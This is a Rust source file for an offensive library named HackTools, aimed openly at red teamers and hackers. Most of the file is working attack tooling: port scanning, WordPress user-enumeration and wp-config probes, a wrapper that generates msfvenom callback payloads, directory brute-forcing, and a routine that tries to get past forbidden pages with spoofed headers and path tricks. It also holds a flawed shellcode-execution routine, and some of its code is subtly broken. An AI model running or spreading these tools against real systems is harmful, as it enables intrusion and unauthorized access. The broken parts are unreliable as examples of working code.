//! # HackTools
//! 
//! A suite of functions mostly made for "Red Teamers" and Hackers.
//! 
#![allow(dead_code)]
#![allow(unused_imports)]
#![allow(unused_must_use)]

pub use self::tools::dirf;
pub use self::tools::scan;
pub use self::tools::get;
pub use self::tools::shell;
pub use self::tools::nmap_scan;
pub use self::tools::press_scan;
pub use self::tools::forbid;
pub use self::tools::msf;
pub mod tools {
    use open;
    use std::process::Command;
    use std::io::{self, BufRead};
    use reqwest::StatusCode;
    use memmap::MmapMut;
    use std::fs::OpenOptions;
    use std::io::Write;
    use std::mem;
    use std::net::{IpAddr, TcpStream};
    use std::time::Duration;
    use colorized::*;
/// # Example
/// ```
/// fn main () {
///     scan("127.0.0.1", 80..81, duration::new(5,0));
/// }
/// ```
    pub fn scan(ip: &str, port_range: std::ops::Range<u16>, timeout: Duration) {
        match ip.parse::<IpAddr>() {
            Ok(ip_addr) => {
                for port in port_range {
                    match TcpStream::connect_timeout(&(ip_addr, port).into(), timeout) {
                        Ok(_) => {
                            println!("{}", format!("Port {} is open",port).color(Colors::BrightGreenFg));
                            
                        }
                        Err(_) => println!("{}", format!("Port {} is closed", port).color(Colors::BrightRedFg)),
                    }
                }
            }
            Err(e) => println!("Invalid IP address: {}", e),
        }
    }
/// Grabs output from running a command
/// # Example: 
/// get("cat", &[["/etc/passwd"]])?;
/// 
/// The &[["1", "2", "3"]] can take multiple arguments.
    pub fn get(command: &str, args: &[&str]) -> Result<(), io::Error> {
        let output = Command::new(command)
            .args(args)
            .output()?;

        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            println!("{}", stdout);
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            eprintln!("Command failed: {}", stderr);
        }

        Ok(())
    }
    pub fn string_to_shellcode(input: &str) -> Vec<u8> {
        let mut shellcode = Vec::new();

        for c in input.chars() {
            let encoded = format!("{:02x}", c as u32);
            let bytes = encoded.as_bytes();
            let byte = u8::from_str_radix(unsafe { std::str::from_utf8_unchecked(bytes) }, 16).unwrap();
            shellcode.push(byte);
        }

        shellcode
    }
    pub fn execute_shellcode(shellcode: &[u8]) {
        println!("Please put file path of memory:");
        let mut choice = String::new();
        io::stdin().read_line(&mut choice).expect("Failed to Read Line");
        let choice = choice.trim_end();
        let mut file = OpenOptions::new()
            .read(true)
            .write(true)
            .open(choice)
            .expect("Failed to open file");

        file.write_all(shellcode).expect("Failed to write shellcode");

        let mmap = unsafe {
            MmapMut::map_mut(&file).expect("Failed to memory map")
        };

        let shellcode_fn: fn() = unsafe { mem::transmute(mmap.as_ptr()) };
        shellcode_fn();
    }
/// # Example
/// 
/// This will scan a wordpress url for a hidden url or pages.
/// ```
/// use hacktools::press_scan;
/// fn main() {
/// press_scan("https://wordpress.com", 0);
/// }
/// ```
/// In the parameters you need to make sure to start with either http: or https:
/// the numbers 0-8 will try different common vulneralbilites for recon on the wordpress site given.
/// 

    pub fn press_scan(url: &str, num: usize) -> String {
        let strings_by_num: Vec<&str> = vec![
            "/wordpress/xmlrpc.php",
            "/wp-content/uploads/",
            "wp-json/wp/v2/users",
            "/wp-json/wp/v2/users/1",
            "/wp-json/?rest_route=/wp/v2/users/",
            "/wp-json/?rest_route=/wp/v2/users/1",
            "/?author=1",
            "/wp-login.php",
            "/wp-config.PhP"
        ];

        let index = num.min(strings_by_num.len() - 1);

        let new_url = format!("{}{}", url, strings_by_num[index]);

        println!("Modified URL: {}", new_url);

        let urlz = new_url.clone(); // Cloned the URL for printing purposes
        if open::that(&new_url).is_ok() {
            println!("Opened in the default web browser.");
        } else {
            println!("Failed to open in the default web browser.");
        }

        urlz
    }


/// # Example
/// ```
/// fn main() {
///   let input = "Hello, world!";
///    shell(input, execute_shellcode);
///}
/// ```
    pub fn shell(input: &str, execute: fn(&[u8])) {
        let shellcode = string_to_shellcode(input);
        println!("Generated Shellcode: {:?}", shellcode);
        execute(&shellcode);
    }
/// # Example:
/// 
/// using Command uses the local nmap binary to run a single port scan
/// nmap_scan("127.0.0.1", 80);
    pub fn nmap_scan(ip: &str, port: u16) {
        let output = Command::new("nmap")
            .arg("-p")
            .arg(port.to_string())
            .arg(ip)
            .output()
            .expect("Failed to execute nmap command");

        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            println!("{}", stdout);
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            eprintln!("Command failed: {}", stderr);
        }
    }
/// # Example
/// 
/// Simple way to use metasploit venom in rust for fast Exploits.
/// Make sure to have metasploit installed on your system.
/// ```
/// use hacktools::msf;
/// fn main() -> Result<(), io::Error> {
///     msf("exploit", "ip", port, "format", "Name of File");
///     Ok(())
/// }
    pub fn msf(exploit: &str, ip: &str, port: u16, form: &str, nof: &str) -> Result<(), io::Error> {
        let output = Command::new("msfvenom")
            .args(&["-p", exploit, &format!("LHOST={}", ip), &format!("LPORT={}", port), "-f", form, "-o", nof])
            .output()?;

        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            println!("{}", stdout);
            Ok(())
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            eprintln!("Command failed: {}", stderr);
            Err(io::Error::new(io::ErrorKind::Other, "Command failed"))
        }
    }


/// A web directory finder like dirb
/// # Example:
///  ```
/// use hacktools::dirf;
/// fn main() {
///     dirf("https://example.com", "wordlist.txt");
/// }
/// ```
    pub async fn dirf(url: &str, wordlist_path: &str) -> Result<(), Box<dyn std::error::Error>> {
        let file = std::fs::File::open(wordlist_path)?;
        let reader = io::BufReader::new(file);

        for line in reader.lines() {
            let word = line.map_err(|e| {
                io::Error::new(
                    io::ErrorKind::Other,
                    format!("Failed to read line from wordlist: {}", e),
                )
            })?;

            let full_url = format!("{}{}", url, word);

            let response = reqwest::get(&full_url).await?;

            if response.status().is_success() {
                println!("Found: {}", full_url);
            }
        }

        Ok(())
    }

    
/// # Example
/// 
/// This will let you check for alternate pathways for a forbidden path.
/// 
/// ```
/// use hacktools::forbid;
/// fn main() {
///     forbid("http://example.com", "secret");
/// }
/// ```
/// this is a port to rust from iamj0ker's very useful shell code.
    pub fn forbid(url: &str, path: &str) {
        let output1 = curl(url, path);
        let output2 = curl(url, &format!("%2e/{}", path));
        let output3 = curl(url, &format!("{}/{}.", path, path));
        let output4 = curl(url, &format!("{}/{}/", path, path));
        let output5 = curl(url, &format!("{}/{{}}/{}/", path, path));
        let output6 = curl_with_header("X-Original-URL", path, url);
        let output7 = curl_with_header("X-Custom-IP-Authorization", "127.0.0.1", url);
        let output8 = curl_with_header("X-Forwarded-For", "http://127.0.0.1", url);
        let output9 = curl_with_header("X-Forwarded-For", "127.0.0.1:80", url);
        let output10 = curl_with_header("X-rewrite-url", path, url);
        let output11 = curl(url, &format!("{}%20", path));
        let output12 = curl(url, &format!("{}%09", path));
        let output13 = curl(url, &format!("{}?", path));
        let output14 = curl(url, &format!("{}.html", path));
        let output15 = curl(url, &format!("{}?anything", path));
        let output16 = curl(url, &format!("{}#", path));
        let output17 = curl_with_header_and_method("Content-Length:0", "POST", url, path);
        let output18 = curl(url, &format!("{}/*", path));
        let output19 = curl(url, &format!("{}.php", path));
        let output20 = curl(url, &format!("{}.json", path));
        let output21 = curl_with_method("TRACE", url, path);
        let output22 = curl_with_header("X-Host", "127.0.0.1", url);
        let output23 = curl(url, &format!("{}..;/", path));
        let output24 = curl(url, &format!("{}/;", path));
        let output25 = curl_with_method("TRACE", url, path);

        println!("{} --> {}/{}", output1, url, path);
        println!("{} --> {}/%2e/{}", output2, url, path);
        println!("{} --> {}/{}/.", output3, url, path);
        println!("{} --> {}/{}/", output4, url, path);
        println!("{} --> {}/{{}}/{}/", output5, url, path); // Add an extra curly brace
        println!("{} -H X-Original-URL: {{}} --> {}/{}", output6, path, url);  // Add an extra curly brace
        println!("{} -H X-Custom-IP-Authorization: 127.0.0.1 --> {}/{}", output7, url, path);
        println!("{} -H X-Forwarded-For: http://127.0.0.1 --> {}/{}", output8, url, path);
        println!("{} -H X-Forwarded-For: 127.0.0.1:80 --> {}/{}", output9, url, path);
        println!("{} -H X-rewrite-url: {} --> {}", output10, path, url);
        println!("{} --> {}/{}%20", output11, url, path);
        println!("{} --> {}/{}%09", output12, url, path);
        println!("{} --> {}/{}?", output13, url, path);
        println!("{} --> {}/{}.html", output14, url, path);
        println!("{} --> {}/{}?anything", output15, url, path);
        println!("{} --> {}/{}#", output16, url, path);
        println!("{} -H Content-Length:0 -X POST --> {}/{}", output17, url, path);
        println!("{} --> {}/{}/*", output18, url, path);
        println!("{} --> {}/{}.php", output19, url, path);
        println!("{} --> {}/{}.json", output20, url, path);
        println!("{} -X TRACE --> {}/{}", output21, url, path);
        println!("{} -H X-Host: 127.0.0.1 --> {}/{}", output22, url, path);
        println!("{} --> {}/{}..;/", output23, url, path);
        println!("{} --> {}/{};/", output24, url, path);
        println!("{} -X TRACE --> {}/{}", output25, url, path);
    }

    fn curl(url: &str, path: &str) -> String {
        let output = Command::new("curl")
            .arg("-k")
            .arg("-s")
            .arg("-o")
            .arg("/dev/null")
            .arg("-iL")
            .arg("-w")
            .arg("%{http_code},%{size_download}") // Update the output format
            .arg(&format!("{}/{}", url, path))
            .output()
            .expect("Failed to execute command.");

        String::from_utf8_lossy(&output.stdout).trim().to_string()
    }

    fn curl_with_header(header: &str, value: &str, url: &str) -> String {
        let output = Command::new("curl")
            .arg("-k")
            .arg("-s")
            .arg("-o")
            .arg("/dev/null")
            .arg("-iL")
            .arg("-w")
            .arg("%{http_code},%{size_download}")
            .arg("-H")
            .arg(&format!("{}: {}", header, value))
            .arg(&format!("{}/{}", url, value)) // Replace "path" with "value"
            .output()
            .expect("Failed to execute command.");

        let output_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
        let parts: Vec<&str> = output_str.split(',').collect();
        let http_code = parts[0];
        let size_download = parts[1];

        format!("{} (HTTP Code) --> {}/{}\n{} (Size Download) --> {}/{} -H {}:{} --> {}/{}",
            http_code, url, value, size_download, url, value, header, value, url, value)
    }


    fn curl_with_header_and_method(header: &str, method: &str, url: &str, path: &str) -> String {
        let output = Command::new("curl")
            .arg("-k")
            .arg("-s")
            .arg("-o")
            .arg("/dev/null")
            .arg("-iL")
            .arg("-w")
            .arg("%{http_code},%{size_download}")
            .arg("-H")
            .arg(header)
            .arg("-X")
            .arg(method)
            .arg(&format!("{}/{}", url, path))
            .output()
            .expect("Failed to execute command.");

        let output_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
        let parts: Vec<&str> = output_str.split(',').collect();
        let http_code = parts[0];
        let size_download = parts[1];

        format!("{} (HTTP Code) --> {}/{}\n{} (Size Download) --> {}/{} -H {} -X {} --> {}/{}",
            http_code, url, path, size_download, url, path, header, method, url, path)
    }

    fn curl_with_method(method: &str, url: &str, path: &str) -> String {
        let output = Command::new("curl")
            .arg("-k")
            .arg("-s")
            .arg("-o")
            .arg("/dev/null")
            .arg("-iL")
            .arg("-w")
            .arg("%{http_code},%{size_download}")
            .arg("-X")
            .arg(method)
            .arg(&format!("{}/{}", url, path))
            .output()
            .expect("Failed to execute command.");

        let output_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
        let parts: Vec<&str> = output_str.split(',').collect();
        let http_code = parts[0];
        let size_download = parts[1];

        format!(
            "{} (HTTP Code) --> {}/{}\n{} (Size Download) --> {}/{} -X {} --> {}/{}",
            http_code, url, path, size_download, url, path, method, url, path
        )
    }

}
